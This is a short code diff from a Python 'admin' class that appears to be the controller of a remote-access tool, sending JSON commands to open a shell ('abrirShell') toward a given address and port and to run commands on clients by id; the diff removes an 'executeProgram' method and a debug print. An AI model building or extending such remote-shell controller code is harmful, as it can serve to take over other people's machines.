@@ -21,12 +21,7 @@ class admin:
         return self.doRequest(json)
 
     def abrirShell(self,uid,addr,port):
-        print("displaying clientes!!")
         json={"CMD":"abrirShell","uid":uid,"port":str(port),"addr":addr}
-        return self.doRequest(json)
-
-    def executeProgram(self,fname,uid=0):
-        json={"CMD":"executeProgram","uid":uid,"fname":fname}
         return self.doRequest(json)
 
     def runCommand(self,cmd,uid=0):
